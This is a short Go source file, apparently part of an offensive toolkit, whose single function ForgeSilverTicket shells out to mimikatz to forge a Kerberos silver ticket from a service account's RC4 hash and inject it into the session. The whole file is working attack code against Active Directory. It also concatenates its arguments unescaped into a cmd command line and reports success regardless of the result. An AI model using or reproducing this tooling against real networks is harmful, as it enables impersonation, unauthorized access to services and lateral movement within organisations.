//go:build windows

package kerberos

import (
"os/exec"
)

func ForgeSilverTicket(domain, user, serviceHash, sid, service string) bool {
cmd := exec.Command("cmd", "/c", "mimikatz.exe \"kerberos::golden /user:"+user+" /domain:"+domain+" /sid:"+sid+" /target:"+service+" /rc4:"+serviceHash+" /ptt\" exit")
cmd.Run()
return true
}
